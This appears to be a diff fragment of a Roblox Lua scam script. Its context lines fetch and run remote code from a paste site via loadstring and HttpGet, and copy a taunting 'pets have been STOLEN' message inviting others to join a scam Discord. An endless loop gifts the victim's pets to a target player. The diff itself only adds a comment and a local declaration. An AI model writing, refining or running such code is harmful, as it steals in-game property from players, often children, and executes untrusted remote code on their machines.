@@ -810,13 +810,13 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
 
 -- Start following before gifting
-local followConn = safeFollow()
+local followConn = safeFollow()  -- start following
 
 -- Infinite gifting loop
 while true do
     task.wait(2)
 
-    pets = GetPlayerPets() -- Refresh pet list
+    local pets = GetPlayerPets() -- Refresh pet list each time
 
     for _, pet in ipairs(pets) do
         for _, tool in targetPlr.Backpack:GetChildren() do
